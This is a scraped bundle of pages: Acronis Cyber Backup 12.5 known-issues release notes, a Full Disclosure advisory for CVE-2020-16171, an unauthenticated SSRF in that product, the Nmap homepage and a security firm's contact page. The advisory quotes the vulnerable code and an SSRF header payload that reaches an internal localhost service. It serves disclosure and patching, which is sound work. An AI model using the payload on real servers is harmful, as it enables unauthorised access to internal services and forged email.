  Solution: Either use vSphere Web Client instead of vSphere Host Client to deploy from the OVF template OR prepare a virtual machine for Acronis Cyber Backup appliance manually, as described in User Guide, and boot it from the Acronis Cyber Backup appliance .iso to proceed with the installation.
* [ABR-136964] If Bitdefender Internet Security 2018 is installed on the machine with the management server, agents registered on the management server disappear from the Devices tab after switching to any other tab and back.

  Solution: Add Acronis installation folders to the exclusion list of Bitdefender Internet Security 2018.
* [ABR-131502] Backup to a managed location fails after upgrade from Acronis Cyber Backup 11.7 if the archive is encrypted.

  Solution: Delete the managed location on the Backups tab and re-add the location.
* [ABR-131165] Simultaneous update of multiple Agents for VMware (Virtual Appliance) in the backup console is not possible.

  Solution: update the agents one by one.
* [ABR-130409] A machine may not appear on the Devices tab after Acronis Cyber Backup agent installation if the Acronis Cyber Backup Management Server host name cannot be resolved to IP from the machine where the agent is installed. The following error message appears in the installation log: "Could not resolve host: [HOSTNAME]; Host not found".

  Solution: Ensure that the management server is accessible by its host name from the machine with the agent.
* [ABR-130294] Updating or upgrading Agent for VMware (Virtual Appliance) that was encrypted by using vSphere 6.5 encryption fails. The following error appears: "An encrypted virtual disk device requires an encrypted virtual machine."

  Solution: Decrypt the appliance before update or upgrade.
* [ABR-118182] In some cases, installation may hang at 96% for up to 10-20 minutes because of the Microsoft.VC90.CRT runtime package installation. The main symptom is the Windows Modules Installer (TiWorker.exe) process constantly consuming CPU resources.
* [ABR-221170] The domain is not displayed when adding administrators in the backup console.

### Common

* [ABR-208339] Installation of Acronis Snap Deploy 5 fails if Acronis Backup Management Server is already installed on the machine.
* [ABR-207057] The Bulgarian language is not available in Acronis Bootable Media for MAC.
* [ABR-197628] The management server service or the managed machine service may sometimes crash when a backup plan that is applied to more than 500 devices is running.
* [ABR-197152] Files cannot be browsed and recovered from a disk-level backup of a ReFS-formatted volume on Windows Server 2019.
* [ABR-195544] Backup plan creation may return the "401 Unauthorized" error after the Internet browser that is used to run the backup console was active for a long time (several days) due to improperly used cookies.

  Solution: clean up the cookies in your Internet browser settings or use the "Incognito" mode to open the backup console.
* [ABR-195126] Sometimes the Delete machines modal dialog does not disappear after the machines are deleted from the management server.
* [ABR-145273] When AdGuard Anti-banner is enabled, the backup console does not show some elements making it impossible to use.

  Solution: Add Acronis Cyber Backup management server address to the sites whitelist in AdGuard properties.
* [ABR-129997] When creating a backup of a machine running macOS to a locally attached disk formatted in FAT32 or ExFAT, the backup might fail. The following error appears: "Operating system error: Resource temporarily unavailable."

  Solution: Format the disk with HFS+ and restart the backup.
* [ABR-131366] If a backup file is stored on a FAT32 volume, the backup file size is not reduced after executing retention rules.
* [ABR-131204] When backing up to a USB flash drive on a machine running Mac OS X and by using the Version 12 backup format, the backup operation may fail.. The following error appears: "Enumerator returned empty archive."

  Solution: Re-create the backup plan, with the Backup options > Backup format option set to Version 11.
* [ABR-128461] File-level backup to and recovery from backups of the Version 12 format does not work when performed under bootable media.

  Solution: Back up and recover files or folders by using Agent for Windows/Agent for Linux.
* [ABR-128209] After unmounting a volume mounted from a backup in the read/write mode, a new recovery point is added, even if the mounted volume was not modified. The root cause is that Windows automatically discovers newly appeared volumes and applies metadata changes to them, which forces Acronis Cyber Backup 12.5 to preserve these changes in a new recovery point during unmounting.
* [ABR-127363] The cleanup rule By total size of backups is not available in the backup console if the backup destination is Acronis Cloud Storage.
* [ABR-121236] Exporting multiple plans from the Plans tab does not work.

  Solution: Export plans one by one.
* [ABR-111624] When creating bootable media in OS X 10.8-10.10, Acronis components fail to start. The following error appears: "Code signature invalid."
* [ABR-109012] After deleting resources like virtual machines or mailboxes, a backup plan applied to these resources continue to run and finish with the following warning: "GXT: The item provider has skipped the report of an item with key."

  Solution: Edit the backup plan from the Plans tab and remove the deleted resources from it.
* [ABR-104297] When opening the backup console in the Edge browser on a machine running Windows 10, the following error message may appear: "Can√¢¬Ä¬ôt reach this page." This error message appears when the URL contains the host name of the machine running the management server.

  Solution: Instead of the management server host name, use its IP address or "localhost" (if the management server is installed on the same machine).
* [ABR-68302] The backup replication progress is not properly displayed in the Status column on the Devices tab for the machine that performs the task.

### Active Protection

* [ABR-129451] An Active Protection plan applied to an empty static group is not applied to machines that are added to this group later.

  Solution: Select the static group, revoke the Active Protection plan, and then apply the plan again.

### Acronis Storage Node, Acronis Storage, and data catalog

Installation notes: Agent for Windows is always installed with Acronis Storage Node. The agent is required to browse the location contents.

* [ABR-144981] It is not possible to create or replicate backups of the Version 11 format to a location on Acronis Storage.
* [ABR-143735] Backup locations on Acronis Storage cannot be accessed from the bootable media user interface.

  Solution: Register the bootable media on the management server and browse backups from the Backups tab, by selecting the bootable media as the machine to browse from.
* [ABR-128626] Data catalog cannot be enabled for managed locations created on tape devices.

### Virtualization

* [ABR-214144] A locally attached storage (LAS) of Agent for VMware (Virtual Appliance) is available as a target location for virtual machine files (.vhdx/.vmdk) generated by the "Convert to VM" feature, while it should not be.
* [ABR-206645] A backup of a Hyper-V virtual machine with a persistent memory (PMEM) disk attached fails. The following error appears: "Error occurred during a request for the parameter."
* [ABR-204800] The SAN transport (LAN-free) mode of access to virtual disks does not work if Agent for VMware (Windows) is running on Windows Server 2019 and managing the vSphere 6.7 U1 environment
* [ABR-190422] A Windows VM that is backed up via Agent for Hyper-V, Agent for VMware, or Agent for Windows running on any platform except inside a Nutanix AHV VM cannot be recovered as a Nutanix AHV VM by using bootable media. The recovered machine will be unbootable despite using Acronis Universal Restore.
* [ABR-189882] Backup of a Hyper-V VM fails with "Failed to get the disk information." error if the virtual disk has an ampersand (&) symbol in the .VHD file name.

  Solution: fix the .VHD file name by removing the associated virtual disk from VM configuration and re-adding it after renaming.
* [ABR-169367] Backup of an ESXi VM template by using SAN hardware snapshots fails with "Failed to get the used disk areas on the storage. There is no snapshot for the virtual machine disk" error.

  Solution: Disable the "SAN hardware snapshots" backup option.
* [ABR-164733] The vSphere 6.7 specific "Trusted Platform Module (TPM)" VM property is not preserved when recovering a virtual machine as a new virtual machine.
* [ABR-164732] The vSphere 6.7 specific "Virtualization-based Security (VBS)" VM option is not preserved when recovering a virtual machine as a new virtual machine.
* [ABR-163080] VMware VDDK HotAdd transport mode is disabled when Agent for VMware (Windows) is installed on non-server version of Windows, e.g. Windows 7/8/10.
* [ABR-144733] Agentless backup of virtual machines running Linux by using any policy rule except for [Disk #] (for example, /dev/sda1) does not work.

  Solution: Perform the entire machine backup or use policy rules [Disk #].
* [ABR-137883] Recovery of a Gen2 Hyper-V virtual machine with enabled Secure Boot option to the original location completes with the following warning: "Secure Boot has been disabled in the recovered virtual machine. If required, enable it manually".

  Solution: Follow the recommendation described in the warning. Disabling Secure Boot during recovery is done intentionally to guarantee proper boot up of the virtual machine.
* [ABR-98984] A virtual machine backup or replication fails for all machines if at least one virtual disk is located on an inactive datastore. The following error appears: "GXT: The item provider has skipped the report of an item with key."

  Solution: As long as the datastore remains inactive, exclude this virtual machine from the backup/replication plan or from the device group to which the backup/replication plan is applied.
* [ABR-132899] After you create a recovery point containing a new virtual disk, cleanup of previous recovery points fails. The following error appears: "service\_process.exe has failed."

  Solution: Recreate a full backup.
* [ABR-133681] A backup of an ESXi virtual machine fails if all of the following conditions are met: the backup is performed by Agent for VMware (Windows), the agent is installed in a non-English Windows, and Acronis Managed Machine Service is running under a system account whose name is localized. The following error appears: "You do not have access rights to this file."

  Solution: Uninstall Agent for VMware (Windows) and install it again. Set the user for Acronis services to some existing user or use the Create new user option instead of the default one.
* [ABR-126058] ESXi host devices cannot be added to a group: the Add to group command is unavailable.
* [ABR-125426] Canceling a running activity, like a virtual machine recovery, validation plan execution, or replication plan execution may fail. The following error appears: "An activity with ID = '[ID]' cannot be found."
* [ABR-123601] After migrating a virtual machine within the vSphere vCenter environment, the machine remains bound to Agent for VMware running on the source ESXi host instead of becoming bound to the agent on the target ESXi host, even if automatic binding is enabled for this virtual machine.
* [ABR-121704] The backup percentage status in the Status column on the Devices tab may show invalid percentage (>100%) when backing up more than one virtual machine in a single backup plan and when the backup is performed by Agent for VMware (Windows).
* [ABR-120840] ESXi host configuration backups ignore the GFS and Custom backup schemes selected in the backup plan. As a result, full backups are created instead of incremental and differential ones.
* [ABR-118715] VMware vSphere virtual machine backup may fail if names of the ESXi hosts registered in vCenter cannot be resolved to IP addresses by Acronis Cyber Backup agent (Virtual Appliance or Windows agent), even if the vCenter host name can be resolved properly. The following error appears: "You do not have access rights to this file."

  Solution: Configure network settings at the Acronis Cyber Backup agent, by configuring the DNS or modifying the /etc/hosts file, to allow name resolution to work properly. To verify if the ESXi host can be resolved, run the following command on the machine with the backup agent: ping <ESXi host name>.
* [ABR-111468] Duplicate recovery points are shown for a Hyper-V virtual machine that was migrated within a Hyper-V cluster.

  Solution: Refresh the list of recovery points for this machine.
* [ABR-96496] Acronis Cyber Backup Agent for VMware (Windows) disables Windows NFS server functions when installed on Windows Server 2012, due to the ports conflict.

  Solution: Deploy Agent for VMware (Virtual Appliance) to the target ESX host or install Agent for VMware (Windows) on another machine with the NFS server functionality disabled.

### Tape management

* [ABR-176191] The Recover > Entire machine button is not shown on the recovery points in tape-based locations for backups created after the update to Update 3.1.

  Solution: Refresh the recovery points by clicking the refresh button.
* [ABR-129546] Recovery points in tape-based locations do not appear for the protected machines on the Recovery tab in the Devices list if the tape database was lost and a rescan operation was performed.

  Solution: Browse the backups on tapes by using the Backups tab of the backup console interface.
* [ABR-123328] The backup option Use a separate tape set for each: Backup type is not activated by default during the backup plan creation, if the user first chooses the GFS backup scheme, and then selects the tape destination.

  Solution: Enable this option manually in Backup options.

### Application support

* [ABR-122309; ABR-127970] The information about application items is missing from the data catalog.
* [ABR-120853] Recovering Microsoft Exchange 2007 mailboxes fails if the target Microsoft Exchange version is 2010 or higher. The following error appears: "An invalid type of the target URI."

√Ç¬© Acronis International GmbH, 2003-2021. All rights reserved.[Legal info](https://www.acronis.com/en-us/legal.html)



=== Content from seclists.org_ff411a1d_20250119_125715.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[![fulldisclosure logo](/images/fulldisclosure-logo.png)](/fulldisclosure/)
## [Full Disclosure](/fulldisclosure/) mailing list archives

[![Previous](/images/left-icon-16x16.png)](32)
[By Date](date.html#33)
[![Next](/images/right-icon-16x16.png)](34)

[![Previous](/images/left-icon-16x16.png)](32)
[By Thread](index.html#33)
[![Next](/images/right-icon-16x16.png)](34)

![](/shared/images/nst-icons.svg#search)

# [CVE-2020-16171] Acronis Cyber Backup <= v12.5 Build 16341 Full Unauthenticated SSRF

---

*From*: "Julien Ahrens (RCE Security)" <info () rcesecurity com>

*Date*: Mon, 14 Sep 2020 18:02:11 +0000

---

```
RCE Security Advisory
<https://www.rcesecurity.com>

1. ADVISORY INFORMATION
=======================
Product:        Acronis Cyber Backup
Vendor URL:     <https://www.acronis.com>
Type:           Server-Side Request Forgery [CWE-918]
Date found:     2020-07-30
Date published: 2020-09-14
CVSSv3 Score:   8.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L)
CVE:            CVE-2020-16171

2. CREDITS
==========
This vulnerability was discovered and researched by Julien Ahrens from
RCE Security.

3. VERSIONS AFFECTED
====================
Acronis Cyber Backup v12.5 Build 16341
and below.

4. INTRODUCTION
===============
Businesses can be at risk of losing important data. Lost data leads to costly
downtime, customer dissatisfaction, regulatory fines, and lost revenue. As a
result, IT pros must meet extremely high expectations. You need to keep the
company running 24-hours a day.

Acronis Cyber Backup delivers the data protection that meets today‚Äôs demands. It
keeps your business running, protecting any workload, scaling without limits,
and saving you money.

(from the vendor's homepage)

5. VULNERABILITY DETAILS
========================
All API endpoints running on port 9877 under "/api/ams/" whereof some are
reachable without authentication, do accept an additional custom header called
"Shard":

def get_ams_address(headers):
    if 'Shard' in headers:
        [...]
        return headers.get('Shard')  # Mobile agent >= ABC5.0

The value of this header is afterwards to construct a separate web request send
by the application using a urllib.request.urlopen call:

def make_request_to_ams(resource, method, data=None):
    port = config.CONFIG.get('default_ams_port', '9892')
    uri = '<http://{}:{}{}'.format>(get_ams_address(request.headers), port, resource)
    logging.debug('Making request to AMS %s %s', method, uri)
    headers = dict(request.headers)
    del headers['Content-Length']
    if not data is None:
        headers['Content-Type'] = 'application/json'
    req = urllib.request.Request(uri,
                                 headers=headers,
                                 method=method,
                                 data=data)
    resp = None
    try:
        resp = urllib.request.urlopen(req, timeout=wcs.web.session.DEFAULT_REQUEST_TIMEOUT)
    except Exception as e:
        logging.error('Cannot access ams {} {}, error: {}'.format(method, resource, e))
    return resp

This can be abused to conduct SSRF attacks against otherwise unreachable internal hosts
of Acronis services that are bound to localhost such as the "NotificationService" running
on 127.0.0.1:30572 with a request header like:

Shard: localhost:30572/external_email?

For more details, see the referenced blog post.

6. RISK
=======
The vulnerability can be used by an unauthenticated or authenticated attacker
to query otherwise unreachable internal network resources. As demonstrated in
the corresponding blog post, using this vulnerability, it is possible to i.e.
(amongst others) send out fully customized emails or modify the application's
resource settings.

7. SOLUTION
===========
Update to v12.5 Build 16342

8. REPORT TIMELINE
==================
2020-07-30: Discovery of the vulnerability
2020-07-30: Since the vulnerability is fixed in Cyber Protect: Sent out a
            request to the Vendor to check whether Cyber Backup is EOL and users
            are advised to migrate to Cyber Protect instead.
2020-07-30: CVE requested from MITRE
2020-07-31: MITRE assigns CVE-2020-16171
2020-07-31: Public Disclosure date set to 2020-08-14
2020-08-04: Vendor asks for a 90 days extension
2020-08-04: Extension not granted because there is a fix available already. Public disclosure
            date set to 2020-09-14
2020-09-05: Asking vendor about the status of the fix
2020-09-08: Vendor states that a fix has been backported to Cyber Backup 12.5 under the
            reference ABR-202103
2020-09-14: Public disclosure

9. REFERENCES
=============
<https://www.rcesecurity.com/2020/09/CVE-2020-16171-Exploiting-Acronis-Cyber-Backup-for-Fun-and-Emails/>
<https://dl.acronis.com/u/backup/rn/12.5/user/en-US/AcronisBackup12.5_relnotes.htm>

_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <http://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](32)
[By Date](date.html#33)
[![Next](/images/right-icon-16x16.png)](34)

[![Previous](/images/left-icon-16x16.png)](32)
[By Thread](index.html#33)
[![Next](/images/right-icon-16x16.png)](34)

### Current thread:

* **[CVE-2020-16171] Acronis Cyber Backup <= v12.5 Build 16341 Full Unauthenticated SSRF** *Julien Ahrens (RCE Security) (Sep 15)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from nmap.org_9ba698e9_20250119_142504.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

[Get Nmap 7.95 here](/download)
## News

* Nmap.org has been redesigned! Our new mobile-friendly layout is also on [Npcap.com](https://npcap.com),
  [Seclists.org](https://seclists.org),
  [Insecure.org](https://insecure.org), and
  [Sectools.org](https://sectools.org).* Nmap 7.90 has been released with Npcap 1.00 along with dozens of other performance improvements, bug fixes, and feature enhancements! [[Release Announcement](https://seclists.org/nmap-announce/2020/1) | [Download page](https://nmap.org/download.html)]* After more than 7 years of development and 170 public pre-releases, we're delighted to announce Npcap version 1.00! [[Release Announcement](https://seclists.org/nmap-announce/2020/0) | [Download page](https://nmap.org/npcap/)]* Nmap 7.80 was released for DEFCON 27! [[release notes](https://seclists.org/nmap-announce/2019/0) | [download](https://nmap.org/download.html)]* Nmap turned 20 years old on September 1, 2017! Celebrate by reading [the original Phrack #51 article](/p51-11.html). [#Nmap20](https://twitter.com/hashtag/Nmap20)!* Nmap 7.50 is now available! [[release notes](https://seclists.org/nmap-announce/2017/3) | [download](https://nmap.org/download.html)]* Nmap 7 is now available! [[release notes](/7/) | [download](https://nmap.org/download.html)]* We're pleased to release our new and Improved [Icons of the Web](/favicon/) project‚Äîa 5-gigapixel interactive collage of the top million sites on the Internet!* Nmap has been discovered in two new movies! It's used to [hack Matt Damon's brain in Elysium](movies/#elysium) and also to [launch nuclear missiles in G.I. Joe: Retaliation](movies/#gijoe)!* We're delighted to announce Nmap 6.40 with 14 new [NSE scripts](/book/nse.html), hundreds of new [OS](/book/osdetect.html) and [version detection](/book/vscan.html) signatures, and many great new features! [[Announcement/Details](https://seclists.org/nmap-announce/2013/1)], [[Download Site](https://nmap.org/download.html)]* We just released Nmap 6.25 with 85 new NSE scripts, performance improvements, better OS/version detection, and more! [[Announcement/Details](https://seclists.org/nmap-hackers/2012/4)], [[Download Site](https://nmap.org/download.html)]* Any release as big as Nmap 6 is bound to uncover a few bugs. We've now fixed them with [Nmap 6.01](https://seclists.org/nmap-hackers/2012/3)!* Nmap 6 is now available! [[release notes](/6/) | [download](https://nmap.org/download.html)]* The security community has spoken! 3,000 of you shared favorite security tools for our relaunched [SecTools.Org](https://sectools.org). It is sort of like Yelp for security tools. Are you familiar with all of the [49 new tools](https://sectools.org/tag/new/) in this edition?* [Nmap 5.50 Released](https://seclists.org/nmap-hackers/2011/0): Now with Gopher protocol support! Our first stable release in a year includes 177 NSE scripts, 2,982 OS fingerprints, and 7,319 version detection signatures. Release focuses were the Nmap Scripting Engine, performance, Zenmap GUI, and the Nping packet analysis tool. [[Download page](https://nmap.org/download) | [Release notes](https://seclists.org/nmap-hackers/2011/0)]* Those who missed Defcon can now watch Fyodor and David Fifield demonstrate the power of the Nmap Scripting Engine. They give an overview of NSE, use it to explore Microsoft's global network, write an NSE script from scratch, and hack a webcam--all in 38 minutes! ([Presentation video](/presentations/BHDC10/))* *Icons of the Web*: explore favicons for the top million web sites with our [new poster and online viewer](/favicon).* We're delighted to announce the immediate, free availability of the [Nmap Security Scanner version 5.00](/5/). Don't miss the [top 5 improvements in Nmap 5](/5/#5changes).* After years of effort, we are delighted to release [Nmap Network Scanning: The Official Nmap Project Guide to Network Discovery and Security Scanning](/book/)!* We now have an active Nmap [Facebook page](http://facebook.com/nmap) and [Twitter feed](http://twitter.com/nmap/) to augment the [mailing lists](#lists). All of these options offer RSS feeds as well.

# Nmap: Discover your network

Nmap ("Network Mapper") is a
[free and open source](/npsl/) utility for
network discovery and security auditing. Many systems and network
administrators also find it useful for tasks such as network
inventory, managing service upgrade schedules, and monitoring host or
service uptime. Nmap uses raw IP packets in novel ways to determine
what hosts are available on the network, what services (application
name and version) those hosts are offering, what operating systems
(and OS versions) they are running, what type of packet
filters/firewalls are in use, and dozens of other characteristics. It
was designed to rapidly scan large networks, but works fine against
single hosts. Nmap runs on all major computer operating systems, and
official binary packages are available for Linux, Windows, and Mac OS
X. In addition to the classic command-line Nmap executable, the Nmap
suite includes an advanced GUI and results viewer
([Zenmap](/zenmap/)), a flexible data
transfer, redirection, and debugging tool
([Ncat](/ncat/)), a utility for
comparing scan results ([Ndiff](/ndiff/)), and a packet generation and response analysis tool ([Nping](/nping/)).

Nmap was named ‚ÄúSecurity Product of the Year‚Äù by Linux
Journal, Info World, LinuxQuestions.Org, and Codetalker Digest. It
was even featured in [twelve
movies](/movies/), including
[The Matrix Reloaded](/movies/#matrix),
[Die Hard 4](/movies/#diehard4),
[Girl With the Dragon Tattoo](/movies/#gwtdt),
and
[The Bourne Ultimatum](/movies/#bourne).

Nmap is ...

* Nmap
  Security
  Port Scanner
* **Flexible**: Supports dozens of advanced techniques for
  mapping out networks filled with IP filters, firewalls, routers, and
  other obstacles. This includes many [port scanning](/book/man-port-scanning-techniques.html) mechanisms (both TCP &
  UDP), [OS
  detection](/book/osdetect.html), [version detection](/book/vscan.html), ping sweeps, and more. See the [documentation page](/docs.html).* **Powerful**: Nmap has been used to scan huge networks of
    literally hundreds of thousands of machines.* **Portable**: Most operating systems are supported, including
      Linux,
      Microsoft Windows,
      FreeBSD,
      OpenBSD,
      Solaris,
      IRIX,
      Mac OS X,
      HP-UX,
      NetBSD,
      Sun OS,
      Amiga,
      and more.* **Easy**: While Nmap offers a rich set of advanced features for
        power users, you can start out as simply as "nmap¬†-v¬†-A¬†*targethost*". Both traditional command line and graphical (GUI)
        versions are available to suit your preference. Binaries are
        available for those who do not wish to compile Nmap from source.* **Free**: The primary goals of the Nmap Project is to help make
          the Internet a little more secure and to provide
          administrators/auditors/hackers with an advanced tool for exploring
          their networks. Nmap is available for [free download](https://nmap.org/download.html), and also comes with full
          source code that you may modify and redistribute under the terms of
          the [license](data/COPYING).* **Well Documented**: Significant effort has been put into
            comprehensive and up-to-date man pages, whitepapers, tutorials, and
            even a whole book! Find them in multiple
            languages [here](/docs.html).* **Supported**: While Nmap comes with no warranty, it is well supported by a vibrant community of developers and users. Most of this interaction occurs on the [Nmap mailing lists](#lists). Most bug reports and questions should be sent to the [nmap-dev list](https://seclists.org/nmap-dev), but only after you read the [guidelines](/book/man-bugs.html). We recommend that all users subscribe to the low-traffic [nmap-hackers](https://seclists.org/nmap-hackers) announcement list. You can also find Nmap on [Facebook](http://facebook.com/nmap) and [Twitter](http://twitter.com/nmap). For real-time chat, join the #nmap channel on [Freenode](http://freenode.net/) or [EFNet](http://www.efnet.org/).* **Acclaimed**: Nmap has won numerous awards, including
                "Information Security Product of the Year" by Linux Journal, Info
                World and Codetalker Digest. It has been featured in hundreds of
                magazine articles, several movies, dozens of books, and one comic book
                series. Visit the [press page](nmap_inthenews.html)
                for further details.* **Popular**: Thousands of people download Nmap every day, and
                  it is included with many operating systems (Redhat Linux, Debian
                  Linux, Gentoo, FreeBSD, OpenBSD, etc). It is among the top ten (out of
                  30,000) programs at the Freshmeat.Net repository. This is important
                  because it lends Nmap its vibrant development and user support
                  communities.

## Communication

Nmap users are encouraged to subscribe to the *Nmap-hackers*
mailing list. It is a low volume (6 posts in 2017), moderated list
for the most important announcements about Nmap, Insecure.org, and
related projects. You can join more than 128,000 current subscribers
by submitting your email address here:

(or subscribe with custom options from the [Nmap-hackers list info page](https://nmap.org/mailman/listinfo/announce))

We also have a development list for more hardcore members
(especially programmers) who are interested in helping the project by
helping with coding, testing, feature ideas, etc. New (test/beta)
versions of Nmap are sometimes released here prior to general
availability for QA purposes. You can subscribe at the [Nmap-dev list
info page](https://nmap.org/mailman/listinfo/dev).

Both lists are archived (along with many other security lists) at [Seclists.org](https://seclists.org).

Though it isn't nearly as active as the mailing lists, the official IRC channel is #nmap on [Freenode](http://freenode.net/) (irc.freenode.net).

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

* [Ref Guide](https://nmap.org/book/man.html)* [Install Guide](https://nmap.org/book/install.html)* [Docs](https://nmap.org/docs.html)* [Download](https://nmap.org/download.html)* [Nmap OEM](https://nmap.org/oem/)

## [Npcap packet capture](https://npcap.com/)

* [User's Guide](https://npcap.com/guide/)* [API docs](https://npcap.com/guide/npcap-devguide.html#npcap-api)* [Download](https://npcap.com/#download)* [Npcap OEM](https://npcap.com/oem/)

## [Security Lists](https://seclists.org/)

* [Nmap Announce](https://seclists.org/nmap-announce/)* [Nmap Dev](https://seclists.org/nmap-dev/)* [Full Disclosure](https://seclists.org/fulldisclosure/)* [Open Source Security](https://seclists.org/oss-sec/)* [BreachExchange](https://seclists.org/dataloss/)

## [Security Tools](https://sectools.org)

* [Vuln scanners](https://sectools.org/tag/vuln-scanners/)* [Password audit](https://sectools.org/tag/pass-audit/)* [Web scanners](https://sectools.org/tag/web-scanners/)* [Wireless](https://sectools.org/tag/wireless/)* [Exploitation](https://sectools.org/tag/sploits/)

## [About](https://insecure.org/)

* [About/Contact](https://insecure.org/fyodor/)* [Privacy](https://insecure.org/privacy.html)* [Advertising](https://insecure.org/advertising.html)* [Nmap Public Source License](https://nmap.org/npsl/)

[![](/shared/images/nst-icons.svg#twitter)](https://twitter.com/nmap "Visit us on Twitter")
[![](/shared/images/nst-icons.svg#facebook)](https://facebook.com/nmap "Visit us on Facebook")
[![](/shared/images/nst-icons.svg#github)](https://github.com/nmap/ "Visit us on Github")
[![](/shared/images/nst-icons.svg#reddit)](https://reddit.com/r/nmap/ "Discuss Nmap on Reddit")



=== Content from www.rcesecurity.com_92b39d50_20250119_142500.html ===


[![RCE Security](https://www.rcesecurity.com/wp-content/uploads/2024/03/logo_small.png)](https://www.rcesecurity.com/)

* [Home](https://www.rcesecurity.com/)
* [About](https://www.rcesecurity.com/about/)
* [Services](https://www.rcesecurity.com/consulting-services/)
* [Research](https://www.rcesecurity.com/blog/)
* [Contact Us](https://www.rcesecurity.com/contact/)

Select Page

# Contact Us

We‚Äôre happy to answer all your questions, either via info[at]rcesecurity[.]com ([PGP preferred](https://keys.openpgp.org/vks/v1/by-fingerprint/595CA6DE70B5FA2A325F5F93CE3BF0ACD107D49B)) or via the following contact form:

Please enable JavaScript in your browser to complete this form.Your Name: \*Your email: \*Your message: \*Submit![Loading](https://www.rcesecurity.com/wp-content/plugins/wpforms-lite/assets/images/submit-spin.svg)

* [X](https://twitter.com/MrTuxracer)
* [RSS](https://www.rcesecurity.com/feed/)

Designed by [Elegant Themes](https://www.elegantthemes.com "Premium WordPress Themes") | Powered by [WordPress](https://www.wordpress.org)


